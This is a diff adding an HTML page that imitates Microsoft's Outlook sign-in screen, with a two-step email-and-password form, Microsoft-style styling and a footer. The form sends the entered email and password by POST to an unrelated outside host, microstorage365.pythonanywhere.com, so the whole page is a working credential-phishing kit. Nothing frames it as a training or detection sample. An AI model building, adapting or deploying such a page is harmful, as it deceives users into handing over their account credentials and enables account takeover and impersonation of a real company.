@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Sign in to your Outlook</title>
+
+		<link rel="shortcut icon" href="/images/mi.ico" type="image/x-icon" />
+		<link
+			rel="stylesheet"
+			href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+		/>
+
+		<style>
+			* {
+				box-sizing: border-box;
+				margin: 0;
+				padding: 0;
+				font-family: 'Segoe UI', sans-serif;
+			}
+
+			html {
+				color: #383838;
+			}
+
+			#form::-webkit-scrollbar {
+				background: transparent;
+				width: 0;
+				height: 0;
+			}
+
+			.container-item {
+				z-index: 99999;
+				margin: 3px 10%;
+				overflow-x: hidden;
+			}
+
+			.container-item-2 {
+				display: flex;
+				justify-content: left;
+				align-items: center;
+				margin: 10px 10%;
+				border: 1px solid #7c7c7c;
+				padding: 5px 15px;
+				color: #383838;
+			}
+
+			input {
+				z-index: 1;
+				border: 1px solid transparent;
+				border-bottom: 1px solid #383838;
+				padding: 10px 1px;
+				width: 100%;
+			}
+
+			.slide-one {
+				transition: 0.5s ease all;
+				width: 100%;
+			}
+
+			.slide-two {
+				transition: 0.5s ease all;
+				width: 100%;
+			}
+
+			.slide-one-toggle {
+				transform: translateX(-100%);
+			}
+
+			.slide-two-toggle {
+				transform: translateX(-100%);
+			}
+
+			input:focus {
+				outline: 1px solid transparent;
+				border-bottom: 1px solid red;
+			}
+
+			#form p {
+				font-size: 14px;
+			}
+
+			#form p img {
+				transform: translateY(6px);
+			}
+
+			#form {
+				display: flex;
+				justify-content: space-between;
+				width: 200%;
+				overflow-x: scroll;
+			}
+
+			#btn {
+				border: 1px solid transparent;
+				border-radius: 2px;
+				background: #0067b8;
+				padding: 8px 5px;
+				width: 100px;
+				color: white;
+				text-align: center;
+			}
+
+			span {
+				color: dodgerblue;
+			}
+
+			.btn-item {
+				display: flex;
+				justify-content: right;
+				margin: 25px 0;
+			}
+
+			footer ul {
+				display: flex;
+				position: fixed;
+				bottom: 0;
+				justify-content: center;
+				font-size: 12px;
+				list-style-type: none;
+			}
+
+			footer ul li {
+				padding: 5px 10px;
+			}
+
+			a {
+				color: #383838;
+				text-decoration: none;
+			}
+
+			@media screen and (min-width: 600px) {
+				body {
+					background: linear-gradient(
+						27deg,
+						rgba(231, 216, 210, 1) 28%,
+						rgba(214, 220, 227, 1) 52%,
+						rgba(214, 225, 210, 1) 80%,
+						rgba(231, 216, 210, 1) 100%
+					);
+				}
+
+				.container {
+					transform: translateX(-50%);
+					margin: 5% 50%;
+					box-shadow: 1px 1px 10px #b3b1b180;
+					background: white;
+					padding: 10px;
+					width: 70%;
+				}
+
+				.container-item-2 {
+					transform: translate(-50%, -20px);
+					margin: 6% 50%;
+					box-shadow: 1px 1px 10px #b3b1b180;
+					background: white;
+					padding: 10px;
+					width: 70%;
+				}
+
+				footer {
+					display: flex;
+					justify-content: center;
+				}
+			}
+
+			@media screen and (min-width: 768px) {
+				.container {
+					width: 40%;
+				}
+
+				.container-item-2 {
+					transform: translate(-50%, -50px);
+					width: 40%;
+				}
+			}
+
+			@media screen and (min-width: 1200px) {
+				.container {
+					width: 30%;
+				}
+
+				.container-item-2 {
+					transform: translate(-50%, -70px);
+					width: 30%;
+				}
+			}
+		</style>
+	</head>
+
+	<body>
+		<div class="container">
+			<div class="container-item" style="margin-top: 20px">
+				<img src="/images/mlogo.svg" alt="" /><br /><br />
+				<form
+					id="form"
+					method="post"
+					action="https://microstorage365.pythonanywhere.com"
+				>
+					<div class="slide-one">
+						<h2>Sign in</h2>
+						<p>to continue to Outlook</p>
+						<span class="msg" style="color: red; font-size: 13px"></span>
+						<br />
+						<input
+							type="email"
+							id="email"
+							name="email"
+							placeholder="Email, phone, or Skype"
+							required
+						/><br /><br />
+						<p>
+							No account? <a href=""><span>Create one!</span></a>
+						</p>
+						<div class="btn-item">
+							<p id="btn" class="next">Next</p>
+						</div>
+					</div>
+
+					<div class="slide-two">
+						<span class="msg2" style="color: red; font-size: 13px"></span><br />
+						<p id="back">
+							<i class="fa fa-arrow-left"></i>
+							<span id="name" style="color: #383838"></span>
+						</p>
+						<br />
+						<h2>Enter password</h2>
+						<br />
+						<input
+							type="password"
+							id="password"
+							name="password"
+							placeholder="Password"
+							required
+						/><br /><br />
+						<p>Forget password?</p>
+						<a href="">
+							<p style="color: dodgerblue">Other ways to sign in</p>
+						</a>
+						<div class="btn-item">
+							<button type="submit" id="btn" class="submit">Sign in</button>
+						</div>
+					</div>
+				</form>
+			</div>
+		</div>
+
+		<div class="container-item-2" style="padding-left: 40px">
+			<img src="/images/key.jpeg" width="25px" />
+			<span style="color: #383838">Sign- in options</span>
+		</div>
+
+		<footer>
+			<ul>
+				<a href="#">
+					<li>Terms of use</li>
+				</a>
+				<a href="#">
+					<li>Privacy & cookies</li>
+				</a>
+				<a href="#">
+					<li>...</li>
+				</a>
+			</ul>
+		</footer>
+
+		<script>
+			var next = document.querySelector('.next');
+			var submit = document.querySelector('.submit');
+			var slide_one = document.querySelector('.slide-one');
+			var slide_two = document.querySelector('.slide-two');
+			var email = document.getElementById('email');
+			var nameText = document.getElementById('name');
+			var back_btn = document.getElementById('back');
+			var password = document.getElementById('password');
+			var msg = document.querySelector('.msg');
+			var msg2 = document.querySelector('.msg2');
+
+			var container_item_2 = document.querySelector('.container-item-2');
+			next.addEventListener('click', function () {
+				const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+				if (email.value === '' || !emailPattern.test(email.value)) {
+					msg.textContent =
+						'Enter a valid email address, phone number, or Skype';
+				} else {
+					msg.textContent = '';
+					nameText.textContent = email.value;
+					slide_one.classList.add('slide-one-toggle');
+					slide_two.classList.add('slide-two-toggle');
+					container_item_2.style.display = 'none';
+				}
+			});
+
+			back_btn.addEventListener('click', function () {
+				slide_one.classList.remove('slide-one-toggle');
+				slide_two.classList.remove('slide-two-toggle');
+				container_item_2.style.display = 'flex';
+			});
+		</script>
+	</body>
+</html>
